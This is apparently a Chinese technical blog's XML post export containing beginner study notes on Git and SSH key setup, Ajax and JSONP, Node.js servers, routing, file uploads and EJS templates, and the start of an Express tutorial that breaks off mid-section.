如果合并有冲突，则解决冲突，并在本地提交；
没有冲突或者解决掉冲突后，再用`git push origin <branch-name>`推送就能成功！

如果`git pull`提示`no tracking information`，则说明本地分支和远程分支的链接关系没有创建，用命令`git branch --set-upstream-to <branch-name> origin/<branch-name>`
这就是多人协作的工作模式，一旦熟悉了，就非常简单。

------

### 9. 使用代码托管系统

市面上有名的Git托管系统 :

- [GitHub](https://github.com/)
- [码云](https://gitee.com/)
- [CODING](https://coding.net/)

#### 9.1 码云 生成SSH密钥及使用

1. 本地打开git bash ,`cd`切换到用户的家目录
2. 使用`pwd`来查看目录是否正确
3. 使用 `ssh-keygen.exe -t rsa` 来生成SHA256的SSH密钥(按回车确认即可)
4. `cd .ssh/` 切换至ssh目录
5. `ls` 查看目录下文件
6. `cat id_rsa.pub` 查看生成的密钥,并复制
7. 打开[码云](https://gitee.com/),登录自己的账户.点选个人资料
8. 选择SSH公钥
9. 在添加公钥界面,将刚刚复制好的密钥粘贴进来,再自己取一个该密钥的名字,以便于区分管理
10. 本地新建一个目录,用于拉取远端版本库
11. 使用 `git init`初始化该目录
12. 使用`git remote add origin <SSH地址>` 来添加远程版本库
13. 使用`git remote -v` 来查看远程版本库信息
14. 使用`git pull origin marster`来拉取版本库及代码

#### 9.2 GitHub 生成SSH密钥及使用

1. 运行 git Bash 客户端，输入如下代码：
   - `$ cd ~/.ssh`
   - `$ ls`
   - 这两个命令就是检查是否已经存在 id_rsa.pub 或 id_dsa.pub 文件，如果文件已经存在，那么你可以跳过步骤2，直接进入步骤3
2. 创建一个 SSH key
   - `$ ssh-keygen -t rsa -C "your_email@example.com"`
   - 代码参数含义：
   - `-t` 指定密钥类型，默认是 rsa ，可以省略。
   - `-C` 设置注释文字，比如邮箱。
   - `-f` 指定密钥文件存储文件名。
3. 添加你的 SSH key 到 github上面去
   - `$ cat ~/.ssh/id_rsa.pub`
4. 测试一下该SSH key   在git Bash 中输入以下代码
   - `$ ssh -T git@github.com`
   - 显示类似如下,表示成功:
   - `Hi username! You've successfully authenticated`
5. `git clone 远程git仓库地址`

------

### 10. 文件忽略

想要工作区的某些文件，不受版本的控制，可使用`.gitignore`文件进行忽略.
!(注意, .gitignore文件 是没有名字的文件.)

规则:

- 以斜杠 `/` 开头表示目录
- 以星号 `*` 通配多个字符
- 以问号 `?` 通配单个字符
- 以方括号 `[]` 包含单个字符的匹配列表
- 以叹号 `!` 表示不忽略(跟踪)匹配到的文件或目录

> 配置文件是按行 从上到下 进行规则匹配的，
> 这就意味着如果前面的规则匹配的范围更大，则后面的规则将不会生效.

### 11. 使用 TortoiseGit 操作 Git

> TortoiseGit 俗称 [ GIT小乌龟 ]

------

# Git 常用命令速查

- master 默认主分支
- dev 默认开发分支

> 创建版本库

```sh
# 初始化本地git版本库（创建新仓库）
git init

# 配置用户名
git config --global user.name "xxx"

# 配置邮件
git config --global user.email "xxx@xxx.com"

#查看当前配置列表
git config --list

# clone远程仓库
git clone <url>

```

> 修改、提交、删除

```sh
# 添加index.php文件到缓存区
git add index.php
# 添加所有改动过的文件到缓存区
git add .
# 添加所有文件到缓存区
git add --all

# 提交缓存区内的文件(回车后需要键入描述:wq保存退出)
git commit
# 提交缓存区内的文件,并提供描述
git commit -m "描述"

# 将add和commit合为一步
git commit -am '描述'
# 合并最后一次提交(用于反复修改)
git commit --amend -m 'xxx'

# 删除index.php文件
git rm index.php
# 将index.php文件移出缓存区,但不删除( -r * 递归目录)
git rm --cached index.php
# 将缓存区中的1.html文件移出并删除
git rm -f 1.html

```

> 查看

```sh
# 查看当前版本状态（是否修改）
git status

# 查看所有添加到缓存区的变更(工作区与版本库的区别)
git diff
# 查看工作区文件和库文件区别
git diff index.php
# 查看所有已添加到缓存区,但还未commit的变更(缓存区与版本库的区别)
git diff --cached

# 查看提交历史
git log
# 以简短的方式查看提交日志
git log --oneline

# 行为日志,显示所有提交,回滚等..
git reflog
# 显示缓存区的所有文件
git ls-files

```

> 回退 与 撤销

```sh
# 将当前版本重置为HEAD（通常用于merge失败回退）
git reset --hard HEAD

git reset --hard HEAD^   # 回退上一个版本
git reset --hard HEAD^^  # 回退上两个版本
git reset --hard HEAD~n  # 回退上n个版本

# 回退指定版本，commitid根据log获取
git reset --hard <commitid>

# 在工作区撤销文件的修改
git checkout --filename
# 撤回添加至缓存区的修改,不指定filename则撤回所有
git checkout HEAD [filename]

```

> 分支操作

```sh
# 获取远程分支master并merge到当前分支
git pull origin master

# 显示本地分支
git branch
# 显示所有分支
git branch -a
# 切换到指定分支或标签
git checkout 分支名/标签名

# 新建分支
git branch 分支名
# 删除本地分支 -D 强制删除
git branch -d 分支名

```

> 远程协作

```sh
# 添加远程版本库
git remote add <remote> <url>
# 查看远程版本库信息
git remote -v
# 查看指定远程版本库信息
git remote show <remote>
# 删除远程remote链接
git remote remove <remote>
# 重命名远程链接名
git remote rename <old> <new>

# 下载代码及快速合并
git pull <remote> <branch>

# 上传代码及快速合并
git push <remote> <branch>

# 将本地的远端库合并
git merge origin master

# 将远端库获取本地但不合并
git fetch origin

```

> > 黄超.Seeker
> > 更多信息，详见： [Pro Git（中文版）](https://gitee.com/progit/index.html)]]></content>
      <categories>
        <category>开发资料</category>
      </categories>
      <tags>
        <tag>Git</tag>
        <tag>版本控制</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript Ajax</title>
    <url>/2018/06/28/JavaScript%20Ajax/</url>
    <content><![CDATA[


# 1. Ajax

> Asyn Javascript And Xml  "异步的 JS 和 xml"

请求: 客户端向服务器请求一个文件
响应: 服务端把文件内容 返回给客户端，一般服务端有输出才算真真的响应.

传统的请求: 通过地址栏 刷新页面请求
AJAX的请求: 通过技术 偷偷的请求

------

# 2. XMLHttpRequest对象 XHR

## 2.1 概念

XMLHttpRequest 对象提供了对 HTTP 协议的完全的访问，包括做出 POST 和 HEAD 请求以及普通的 GET 请求的能力。

XMLHttpRequest 可以同步或异步地返回 Web 服务器的响应，并且能够以文本或者一个 DOM 文档的形式返回内容。

------

## 2.2 常用属性

### 1. readyState   请求响应状态

| 状态 | 名称          | 描述                                                         |
| ---- | ------------- | ------------------------------------------------------------ |
| 0    | Uninitialized | 初始化状态。XMLHttpRequest 对象已创建或已被 abort() 方法重置。 |
| 1    | Open          | open() 方法已调用，但是 send()                               |
| 2    | Sent          | Send() 方法已调用，HTTP 请求已发送到 Web 服务器。未接收到响应。 |
| 3    | Receiving     | 所有响应头部都已经接收到。响应体开始接收但未完成。           |
| 4    | Loaded        | HTTP 响应已经完全接收。                                      |

### 2. status  返回服务器的响应状态码

- 200  成功响应
- 404  文件不存在
- 304  文件来自缓存
- 500  服务器未知错误
- 503  服务器宕机 服务暂时不可用

### 3. responseText 获取服务器的响应文本

------

## 2.3 常用方法

### 1. open()  初始化请求

- 参1 method 请求类型 GET/POST/HEAD
- 参2 url 请求主体
- 参3 是否同/异步: true(默认异步) / false(同步)
- 参4,5 认证的帐号和密码

### 2. send()  正式发送请求

- GET 方式 无参
- POST 方式 有可选参数

### 3. setRequestHeader()  设置POST请求头信息

- `xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');`

------

## 2.4 事件句柄 onreadystatechange

`readyState` 的值一变化就触发

# 3. Ajax+php 请求流程

- 创建对象 xml请求对象
- 初始化请求
- 发送请求
- 接收 并 处理响应

```
    <h2 id="box"></h2>

    <script>
    // 创建 XHR 对象
    var xhr = new XMLHttpRequest();
    // console.dir(xhr);
    
    // 捕获响应结果,绑定事件
    xhr.onreadystatechange = function(){
        // console.log(xhr.readyState);
        if (xhr.readyState == 4) {
            if (xhr.status == 200) {
                // 处理结果
                // alert(xhr.responseText);
                box.innerHTML = xhr.responseText;
            }
        }
    }

    // 请求初始化
    // 参1 method 请求类型 GET/POST/HEAD
    // 参2 url 请求主体
    // 参3 是否同/异步: true(默认异步) / false(同步)
    // 参4,5 认证的帐号和密码
    xhr.open('get', './php/1.php', true);

    // 正式发送请求
    xhr.send();


    </script>
```



# 4. 处理json数据

- PHP:  json_encode()
- JS :  eval()  或 JSON.parse()

# 5. 同步和异步

open()方法的参3 决定了是否同异步
默认参数为true,表示请求是异步的,AJAX不会影响到其他程序代码的执行
参数为false时,表示请求是同步的,AJAX将会阻塞之后程序的运行,直到响应完全接收完毕为止.

```
    <h1>AJAX 同异步</h1>
    <button onclick="loadHtml(true)">异步</button>
    <button onclick="loadHtml(false)">同步</button>
    <hr>

    <script>

        function loadHtml(b){
            var msg = '我是来自于JS的值';

            var xhr = new XMLHttpRequest();
            xhr.onreadystatechange = function(){
                if (xhr.readyState == 4) {
                    if (xhr.status == 200) {
                        msg = xhr.responseText;
                        console.log(msg);
                        
                    }
                }
            }
            xhr.open('get', './php/6.php', b);
            xhr.send();

            alert(msg);
        }
    
    </script>
```



# 6. post 和 get

- POST方式
- GET方式

# 7. Ajax 无法跨域 与 jsonp

- Ajax 无法跨域

  为什么产生这个问题? (产生跨域的原因:)
  a. 发出的请求不是本域的,比如协议/域名/端口号,任何一个不一样都算是跨域.
  b. 浏览器的限制,不是服务器不让你跨域,是浏览器为了安全限制你不能随便跨域.
  c. XHR对象 不支持跨域. 如果你发送的不是XHR请求,就算是跨域,浏览器也不会报错

PS. 新建浏览器图标, [属性]--[目标] 新增以下: 关闭安全验证
 --disable-web-security --user-data-dir=d:\temp1

- JSONP
  - 不受同源策略的影响

```
PS. 九种跨域方式实现原理（完整版）
`https://segmentfault.com/a/1190000018017118`
```

```
    <h1>JSONP</h1>
    <button onclick="loadHtml()">加载</button>
    <hr>

    <div id="box"></div>

    <script>
        function makedata(obj){
            // alert(obj);
            box.innerHTML = '';
            // JSON.parse()  // NO
            for (var i in obj) {
                box.innerHTML += i  + ' : ' + obj[i] + '<br>';
            }
        }

        // JSONP 关键步骤
        function loadHtml(){
            // 创建JS对象
            var js = document.createElement('script');
            // 设置JS标签的src值
            js.src = 'http://127.0.0.1/s86/JS13/php/7.php';
            // 添加这个JS对象到页面之中
            document.body.appendChild(js);
        }



       /* function loadHtml(){
            var xhr = new XMLHttpRequest();
            xhr.onreadystatechange = function(){
                if (xhr.readyState == 4) {
                    if (xhr.status == 200) {
                        box.innerHTML = '';
                        var obj = JSON.parse(xhr.responseText);
                        for (var i in obj) {
                            box.innerHTML += i  + ' : ' + obj[i] + '<br>';
                        }
                    }
                }
            }
            xhr.open('get', 'http://127.0.0.1/s86/JS13/php/7.php', true);
            xhr.send();
        }*/
    </script>
   <!--  <script>
        // JS OBJ
        makedata({"id":"7","name":"\u5929\u4f7f","sex":"0","age":"30","province":"\u6c5f\u82cf"})
    </script> -->
</body>
```



# 8. 封装Ajax

```
    <h1>AJAX封装</h1>
    <hr>
    
    <button onclick="ajax('./php/8.php',fun1)">封装</button>
    <div id="box"></div>

    <script>
    	
    	function ajax(url,fun1){

    		var xhr = new XMLHttpRequest();
    		xhr.open('get',url,true);
    		xhr.send();
    		xhr.onreadystatechange = function(){
    			if (xhr.readyState==4) {
    				if (xhr.status==200) {
    					res = xhr.responseText;
    					fun1(res);
    				}
    			}
    		}
    	}

    	function fun1(y){
    		box.innerHTML=y;
    	}
    </script>
```



# PS:状态码

```
HTTP 状态
    1xx: 信息
        消息: 描述: 
        100 Continue 服务器仅接收到部分请求，但是一旦服务器并没有拒绝该请求，客户端应该继续发送其余的请求。 
        101 Switching Protocols 服务器转换协议：服务器将遵从客户的请求转换到另外一种协议。 
    2xx: 成功
    消息: 描述: 
        200 OK 请求成功（其后是对GET和POST请求的应答文档。） 
        201 Created 请求被创建完成，同时新的资源被创建。 
        202 Accepted 供处理的请求已被接受，但是处理未完成。 
        203 Non-authoritative Information 文档已经正常地返回，但一些应答头可能不正确，因为使用的是文档的拷贝。 
        204 No Content 没有新文档。浏览器应该继续显示原来的文档。如果用户定期地刷新页面，而Servlet可以确定用户文档足够新，这个状态代码是很有用的。 
        205 Reset Content 没有新文档。但浏览器应该重置它所显示的内容。用来强制浏览器清除表单输入内容。 
        206 Partial Content 客户发送了一个带有Range头的GET请求，服务器完成了它。 
    3xx: 重定向
    消息: 描述: 
        300 Multiple Choices 多重选择。链接列表。用户可以选择某链接到达目的地。最多允许五个地址。 
        301 Moved Permanently 所请求的页面已经转移至新的url。 
        302 Found 所请求的页面已经临时转移至新的url。 
        303 See Other 所请求的页面可在别的url下被找到。 
        304 Not Modified 未按预期修改文档。客户端有缓冲的文档并发出了一个条件性的请求（一般是提供If-Modified-Since头表示客户只想比指定日期更新的文档）。服务器告诉客户，原来缓冲的文档还可以继续使用。 
        305 Use Proxy 客户请求的文档应该通过Location头所指明的代理服务器提取。 
        306 Unused 此代码被用于前一版本。目前已不再使用，但是代码依然被保留。 
        307 Temporary Redirect 被请求的页面已经临时移至新的url。 
    4xx: 客户端错误
    消息: 描述: 
        400 Bad Request 服务器未能理解请求。 
        401 Unauthorized 被请求的页面需要用户名和密码。 
        402 Payment Required 此代码尚无法使用。 
        403 Forbidden 对被请求页面的访问被禁止。 
        404 Not Found 服务器无法找到被请求的页面。 
        405 Method Not Allowed 请求中指定的方法不被允许。 
        406 Not Acceptable 服务器生成的响应无法被客户端所接受。 
        407 Proxy Authentication Required 用户必须首先使用代理服务器进行验证，这样请求才会被处理。 
        408 Request Timeout 请求超出了服务器的等待时间。 
        409 Conflict 由于冲突，请求无法被完成。 
        410 Gone 被请求的页面不可用。 
        411 Length Required "Content-Length" 未被定义。如果无此内容，服务器不会接受请求。 
        412 Precondition Failed 请求中的前提条件被服务器评估为失败。 
        413 Request Entity Too Large 由于所请求的实体的太大，服务器不会接受请求。 
        414 Request-url Too Long 由于url太长，服务器不会接受请求。当post请求被转换为带有很长的查询信息的get请求时，就会发生这种情况。 
        415 Unsupported Media Type 由于媒介类型不被支持，服务器不会接受请求。 
        416  服务器不能满足客户在请求中指定的Range头。 
        417 Expectation Failed   
    5xx: 服务器错误
    消息: 描述: 
        500 Internal Server Error 请求未完成。服务器遇到不可预知的情况。 
        501 Not Implemented 请求未完成。服务器不支持所请求的功能。 
        502 Bad Gateway 请求未完成。服务器从上游服务器收到一个无效的响应。 
        503 Service Unavailable 请求未完成。服务器临时过载或当机。 宕机
        504 Gateway Timeout 网关超时。 
        505 HTTP Version Not Supported 服务器不支持请求中指明的HTTP协议版本。 

```

]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>Ajax</tag>
        <tag>Jsonp</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript-Node.js</title>
    <url>/2018/07/10/JavaScript%20Node.js/</url>
    <content><![CDATA[
# Node.js

## 1.关于 Node.js

Node.js是一个让 JavaScript 运行在服务器端的开发平台.

### 1.1. 介绍

1). Node.js 不是一种独立的语言，与PHP、JSP、Python、Perl、Ruby的"既是语言，也是平台"不同，Node.js的使用JavaScript进行编程，运行在JavaScript引擎上（V8）。

2). 与PHP、JSP等相比，Node.js跳过了Apache、Naginx、IIS等HTTP服务器，它自己不用建设在任何服务器软件之上。Node.js的许多设计理念与经典架构（LAMP）有着很大的不同，可以提供强大的伸缩能力。

官网: https://nodejs.org/en/
中文网: http://nodejs.cn/

### 1.2. 特点

```
单线程 | 非阻塞I/O | 事件驱动
```

#### 1). 单线程

```
所有客户端请求的连接 都使用一个线程来处理.

Node.js 不是给每个连接去创建新的 线程,而是仅仅使用一个线程来处理.
单线程带来的好处,减少内存的损耗,提高并发量. 操作系统完全不再有线程创建和销毁的开销.
```

#### 2). 非阻塞I/O

```
I/O操作不会阻塞程序的运行
I: Input  输入
O: Output 输出

在阻塞模式下,一个线程只能处理一项任务,想要提高吞吐率,必须通过多线程
而非阻塞模式下,一个线程 永远在执行某种运算操作.这个线程的CPU 核心利用率永远是满载的
```

#### 3). 事件驱动

```
客户端 请求建立连接，提交数据等行为，就会触发 相应的事件.
在Node中，在一个时刻，只能执行 一个事件回调函数，但是在执行 一个事件回调函数的中途，（比如，又有新用户连接了）可以转而处理其他事件，然后返回继续执行原事件的回调函数，这种处理机制，称为“事件环”机制.
```

Node.js底层是C++(V8引擎也是C++写的).底层代码中，近半数都用于事件队列、回调函数队列的构建.用事件驱动 来完成服务器的 任务调度,是Node.js中 真正底层核心逻辑.

#### 4). 三特点说明

单线程
    是为了减少内存的开销,操作系统的内存换页(创建/销毁)
    但是,如果某一个请求 有I/O操作,单线程就会被阻塞了!
非阻塞I/O
    程序不会傻等I/O语句的执行结束,才继续后续代码的运行,而会直接运行后续代码.
    但是,非阻塞就能完美的解决问题吗, 比如 小A的业务执行I/O过程中,有小C要新的请求,此时则么办?
事件驱动(事件环)
    不管是新用户的请求,还是老用户的I/O操作,都将以事件的方式加入到事件环之中,等待调度.

Node.js 中所有的I/O都是异步的.回调函数 套 回调函数
泡茶 : 洗茶壶 4 / 洗茶杯 3 / 用茶壶烧开水 8 / 准备茶叶 2 / 泡茶水 5 / 倒茶水 1
4 + 8 + 5 + 1 = 18
 3 + 2 

### 1.3 Node.js 的优缺点,适合开发什么?

#### 1). 优点

​    善于I/O,不善于 大量计算
​    处理高并发
​    服务器推送

#### 2). 缺点

​    单线程的缺点: 单一线程 一旦奔溃则整个服务全奔溃
​    服务不是绝对可靠的.

#### 3). 适用场景

```
不能完全替代 传统的后端语言,但在某些方面优于传统.
当应用程序需要处理大量并发的I/O操作，而在发出响应之前，应用程序内部 并不需要进行非常复杂的计算处理的时候，Node.js非常适合。
Node.js也非常适合与web socket配合，开发长连接的实时交互应用程序。

- 聊天室
- 图文直播
- 考试系统
- 收集用户数据的表单
- 提供JSON的API
```

## 2.安装使用node

### 2.1 windows环境安装

`node -v `查看版本

`node 文件名`  运行文件

### 2.2 搭建Node.js服务器 

​	-- 首个nodejs页面页面

```
// 搭建nodejs WEB服务器

// 引入HTTP模版
var http = require('http');

var hostname = '127.0.0.1';
var port = 3000;

// 创建服务器
// req 表示请求(request) / res 表示响应(response)
var server = http.createServer(function(req, res){
    // 设置HTTP头信息. 状态码 200; 文件类型是html; 字符集 utf-8
    res.writeHead(200, {'Content-type':'text/html;charset=UTF-8'});
    // 服务器响应输出完成
    res.end('Hi~ o(*￣▽￣*)ブ, 首个nodejs页面,您的积分为: ' + (50 + 10) + '分'); 
});

// 运行服务器
server.listen(port, hostname, function(){
    console.log(`请访问: http://${hostname}:${port}`);
});
```

如果修改了程序代码,必须中断当前的node服务,重新在node一次

node.js是服务器的程序,写好的JS代码,都将运行在服务器上.返回给客户端的, 都是已经处理好的结果

node就是一个JS的运行环境

js文件是不能直接拖入浏览器取运行的,必须靠node去执行



### 2.3 根目录 与 web容器

```
1). Node.js没有根目录的概念，因为它根本没有任何的web容器！
```

​    

```
2). 静态页面的呈现

URL和真实的物理文件之间 是没有关系的。
URL是通过 Node 的路由设计之后，才呈现出 某一个静态文件的
```

```
3). HTTP运行原理
```

由此,我们可以看出,要是使用nodejs 搭建服务器,
是需要写 各种回调函数,定义 各种路由规则,来实现 页面的显示.
nodejs中就是 回调函数 套回调函数,每个回调函数 都是一个事件

由此就用到了 nodejs的三个特性:
    单线程 | 非阻塞I/O | 事件驱动(事件环)
    URL路由规则,与实际的物理文件,不一定有直接的联系. 

## 3.HTTP模块

   Node.js将各种功能，都划分为了一个个mudule(模块)
   需要用什么模块,就可以使用require('')来引入使用

## 4.URL模块

​	解析URL

```
   // GET 参数的处理
    var getParams = url.parse(req.url, true).query;
    var name = getParams.name;
    var age = getParams.age;
    var sex = getParams.sex;
    res.end('服务器接收到了以下信息: '+ name + ' | ' + age + ' | ' + sex);
```



​	路由设计

```

var http = require('http');
var url = require('url');

var hostname = '127.0.0.1';
var port = 3000;

// 创建服务器
var server = http.createServer(function(req, res){
    // 跳过了 chrome 的收藏夹图标的请求
    if (req.url == '/favicon.ico') return;
    res.writeHead(200, {'content-type': 'text/html;charset=utf-8'});

    // /stu/20190212007  查询学员
    // /tch/00128        查询老师
    
    //  获取URL中的path部分
    var user = url.parse(req.url).pathname;

    // substr
    if (user.substr(0, 5) == '/stu/') {
        var stuid = user.substr(5);
        // console.log(stuid);
        if (/^\d{11}$/.test(stuid)) {
            res.end('查询到的学号是: ' + stuid);
        } else {
            res.end('学员的学号有误!!!');
        }
    } else if (user.substr(0, 5) == '/tch/') {
        var tchid = user.substr(5);
        // console.log(tchid);
        if (/^\d{5}$/.test(tchid)) {
            res.end('查询到的工号是: ' + tchid);
        } else {
            res.end('工号有误!!!');
        }
    } else {
        res.end('URL有误,请检查重试!!!');
    }
});

// 运行服务器
server.listen(port, hostname);
```



## 5.文件系统

​	5.1. 新建文件夹 / 删除文件夹 / 文件状态信息 / 读取文件夹

​	5.2. 读取出 文件夹/文件

## 6.静态目录 文件加载 (web容器)



## 7.模块的概念

   在Node.js中,不可能用一个js文件去写全部的业务,肯定要有MVC.
   它以模块为单位 划分所有功能,并且提供了一个 完整的模块加载机制,我们可以将应用程序 划分为各个不同的部分.

   每一个JavaScript文件都是一个模块；
   而多个JavaScript文件可以使用require引入,使他们共同实现了一个功能模块.



### 7.1 输出变量/函数

​    Node.js中,JS文件中定义的变量、函数,都只在这个文件内部有效.
​    其他文件中需要引用变量、函数时,必须使用`exports对象`进行暴露(输出).
​    使用者要用`require()`命令,引用执行这个JS文件.

### 7.2 输出一个类(构造函数)

​    可以用`module.exports = 构造函数名;`的方式 向外输出一个类

### 7.3 模块关联关系

- 某一个js文件中,有函数或变量: exports.变量 = 变量;
- 某一个js文件中,有一个类: module.exports = 构造函数名;

### 7.4 模块封装

## 8.npm

 (node package management)

   这是一个工具名字.npm的主要职责是 安装开发包和管理依赖项.
   安装开发包:安装 `npm install`命令；更新 `npm update`命令.
   管理依赖项:借助 package.json 文件;最简单生成 package.json 的方法就是 `npm init`

   npm不需要单独安装,只要安装了 Node.js 环境,npm 就已经包含在里面了. 查看 npm 版本: `npm -v`

   **为什么要使用npm?**
   开发时,会使用到各种功能的组件,所有组件都由我们自己来写代码的话,开发效率就会很低.我们不要重复的去造轮子,要学会使用已有的工具,来完善我们的项目,站在巨人的肩膀上去工作.
   npm是js世界里的一个伟大的社区,能够让开发者更加轻松的共享代码和共用代码片段或模块组件.

   https://www.npmjs.com/   # npm官网
   https://npm.taobao.org/  # 淘宝npm镜像

   不要修改 [node_modules] + package-lock.json 这两个文件,因为它是使用npm去管理的

## 9.POST请求

   相比较GET请求，POST请求比较复杂。
   因为Node.js认为，使用POST请求时，数据量会比较多。
   为了追求极致的效率，它将数据拆分成为了众多小的数据块(chunk)，然后通过特定的事件，将这些小数据块有序传递给回调函数。

```

var http = require('http');
var fs = require('fs');
var querystring = require('querystring');

var hostname = '127.0.0.1';
var port = 3000;

var server = http.createServer(function(req,res){
    if (req.url == '/form') {
        // 读取表单加载页面
        fs.readFile('./form.html', function(err, data){
            res.writeHead(200, {'content-type': 'text/html;charset=UTF-8'});
            res.end(data);
        });
    } else if (req.url == '/dopost' && req.method.toLocaleLowerCase() == 'post') {
        // 如果访问/dopost,且请求类型是post
        // 进行POST数据处理
        var postData = '';
        // node为了实现极致的效率,所以把post分成多个小份去传递
        req.addListener('data', function (chunk){
            postData += chunk;
        });

        // 全部接收完毕
        req.addListener('end', function(){
            console.log(postData);

            // 将post字串转换为一个对象
            var dataObj = querystring.parse(postData);
            console.log(dataObj);
            console.log(dataObj.name);
            res.end('POST DATA Success!');
        });


    } else {
        res.end('404');
    }

});

server.listen(port, hostname);
```



## 10.文件上传处理

    原生写POST处理,比较复杂,要写两个监听.
    文件上传业务比较麻烦.所以,用第三方模块: `formidable`
```

var http = require('http');
var fs = require('fs');
var querystring = require('querystring');
var formidable = require('formidable'); // 处理表单数据
var timestamp = require('time-stamp'); // 时间
var path = require('path'); // 时间

var hostname = '127.0.0.1';
var port = 3000;

var server = http.createServer(function(req,res){
    if (req.url == '/form') {
        // 读取表单加载页面
        fs.readFile('./form_file.html', function(err, data){
            res.writeHead(200, {'content-type': 'text/html;charset=UTF-8'});
            res.end(data);
        });
    } else if (req.url == '/dopost' && req.method.toLocaleLowerCase() == 'post') {
        // 如果访问/dopost,且请求类型是post
        // formidable 处理 parse a file upload
        var form = new formidable.IncomingForm();

        // 设置上传目录
        form.uploadDir = "./uploads";
        // 该模块已经将 POST数据 和 文件数据 分离处理
        // 当代码执行到parse()方法的回调函数时,表单中的数据 就都已经处理好了
        form.parse(req, function(err, fields, files) {
            // console.log(fields);
            // console.log(files);
            // 处理上传文件的存储
            // 新文件名: 时间 + 随机数 + 后缀
            var t = timestamp('YYYYMMDDHHmmss');
            var ran = parseInt(Math.random()* 100000);
            var extname = path.extname(files.myfile.name);

            // 旧文件名
            var oldPath = './' + files.myfile.path;
            // 新文件名
            var newPath = './uploads/' + t + ran + extname;
            console.log(oldPath);
            console.log(newPath);

            // 实现改名
            fs.rename(oldPath, newPath, function (err){
                res.end('文件上传成功!!');
            });
        });
    } else {
        res.end('404');
    }

});

server.listen(port, hostname);
```



## 11.ejs模版

    https://ejs.co/        #官网
    https://www.npmjs.com/package/ejs #npm上的ejs包
    ejs是Embedded JavaScript templates的简称,意思是嵌入式JavaScript模板.node中的后台模版.

------

```

var http = require('http');
var ejs = require('ejs');
var fs = require('fs');
var hostname = '127.0.0.1';
var port = 3000;

var server = http.createServer(function (req, res) {
    if (req.url == '/') {
        fs.readFile('./views/index.ejs', function (err, data) {
            // 模版
            // console.log(data);
            var template = data.toString();
            // console.log(template);
            // 数据
            var dict = {
                title: 'EJS 模版的使用',
                content: '我是段落内容....',
                pic: './imgs/1.jpg',
                songci : {
                    title: '酒调歌头',
                    list : [
                        '12345',
                        '67890',
                        '09876',
                        '54321'
                    ]
                }
            }
            // 绑定数据
            var html = ejs.render(template, dict);

            // 显示输出页面
            res.writeHead(200, {'content-type':'text/html'});
            res.end(html);
        });
    } else if (req.url == '/imgs/1.jpg') {
        fs.readFile('./imgs/1.jpg', function (err, data) {
            res.writeHead(200, {'content-type':'image/jpg'});
            res.end(data);
        });
    }
});

server.listen(port, hostname);
```

```
<!--index.ejs-->
<!DOCTYPE html>
<html lang="cn">
<head>
    <meta charset="UTF-8">
    <title>Document</title>
    <style type="text/css"></style>
</head>
<body>
    <h1><%= title %>></h1>
    <hr>

    <p><%= content %>></p>
    <p><%= content %>></p>
    <p><%= content %>></p>
    <p><%= content %>></p>

    <hr>
    <br>
    <img src="<%= pic %>" width="300">

    <hr>
    <h2><%= songci.title %></h2>
    <ul>
        <% for (var i = 0; i < songci.list.length; i++) { %>
        <li><%= songci.list[i] %></li>
        <% } %>
    </ul>

</body>
</html>
```



## PS:V8引擎说明

​    V8 JavaScript引擎是 Google用于其Chrome浏览器的底层JavaScript引擎。
​    Google使用V8创建了一个用C++编写的超快解释器，该解释器拥有另一个独特特征：
​    您可以下载该引擎并将其嵌入任何应用程序。
​    V8 JavaScript引擎并不仅限于在一个浏览器中运行。
​    因此，Node.js实际上会使用Google编写的V8 JavaScript引擎，并将其重建为可在服务器上使用。]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>Node.js</tag>
        <tag>npm</tag>
        <tag>ejs</tag>
        <tag>express</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript-Express</title>
    <url>/2018/07/15/JavaScript%20Express/</url>
    <content><![CDATA[
# Express

## 1.Express框架

基于 Node.js 平台，快速、开放、极简的 web 开发框架。
它是用于后台NodeJs的框架,与JQuery/Bootstrap/vue.js/AngularJs这类前端框架是不一样的!
Express 不对 Node.js 已有的特性进行二次抽象，我们只是在它之上扩展了 Web 应用所需的基本功能。
丰富的 HTTP 快捷方法和任意排列组合的 Connect 中间件，让你创建健壮、友好的 API 变得既快速又简单。

对比原生Node.js
    使用原生Node.js开发,会发现有很多问题:
    - 呈现静态页面很不方便,需要处理每个HTTP请求,还要考虑304缓存问题.
    - 路由处理代码不直观清晰,需要写很多正则表达式和字符串函数.
    - 开发者不能集中精力写业务,要考虑很多其他的东西.

官网：http://expressjs.com/
中文官网：http://www.expressjs.com.cn/

## 2.安装

npm install express --save  #即可安装最新版本的Express

- Express4.x与3.x版本的差别非常大，我们使用4.x

### 2.1. 基本使用

```
//  引入express 框架
var express = require('express');
// console.log(express);

// 创建 express 的 HTTP服务器
var app = express();
// 指定框架的模版引擎,无需导入
app.set('view engine', 'ejs');

// 指定静态化的目录
app.use('/static', express.static('./static'));


// 设置路由规则
app.get('/', function(req, res){
    // 响应输出
    res.send('Hello Express~~~');
});

app.get('/test', function(req, res){
    // 响应输出
    res.send('这是test页面');
});

app.get('/user', function(req, res){
    // 绑定并输入数据
    res.render('user', {
        'userlist' : [
            '钢铁侠 屎大颗',
            '绿巨人 浩克',
            '美队 史蒂文',
            '雷神 托尔',
            '邪神 洛基',
            '蜘蛛侠 彼得帕克'
        ]
    });

});

// 设置请求监听
app.listen(3000);
```

### 2.2. 路由处理

```
//  引入express 框架
var express = require('express');
// 创建 express 的 HTTP服务器
var app = express();

// 支持所有的请求方式, 实现中间件的功能
app.all('/t', function(req, res, next){
    console.log(new Date().toString());
    next();
});


// 设置路由规则
app.get('/', function(req, res){
    // 响应输出
    res.send('Hello Express~~~');
});
// GET
app.get('/t', function(req, res){
    // 响应输出
    res.send('GET 请求');
});
// POST
app.post('/t', function(req, res){
    // 响应输出
    res.send('POST 请求');
});

// DELETE
app.delete('/t', function(req, res){
    // 响应输出
    res.send('DELETE 请求');
});


// 路由方法默认匹配 pathnameb部分,忽略get参数
// 对大小写不敏感
app.get('/aaa', function(req,res){
    console.log(req.query);
    res.send('3A页面 ');
});

// 路由路径 默认express path-to-regexp 匹配路由路径

// 正则路由   /stu/1234567890/tom
app.get(/^\/stu\/(\d{10})\/(\w+)$/, function(req,res){
    console.log(req.params);
    res.send('学员的学号是: '+ req.params[0]);
});

// 路由参数
